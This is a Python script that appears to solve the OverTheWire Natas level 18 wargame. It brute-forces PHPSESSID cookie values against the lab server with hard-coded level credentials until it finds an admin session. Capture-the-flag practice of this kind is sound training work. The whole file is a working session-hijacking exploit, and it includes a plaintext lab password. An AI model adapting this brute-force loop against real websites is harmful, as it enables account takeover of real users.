import requests

host="http://natas18.natas.labs.overthewire.org"

username="natas18"
password="xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"

cookies=dict()
for i in range(0,641):
    print i
    cookies['PHPSESSID']=str(i)
    r = requests.get(host,cookies=cookies,auth=(username,password))
    if not "regular" in r.text:
        print r.text
        break
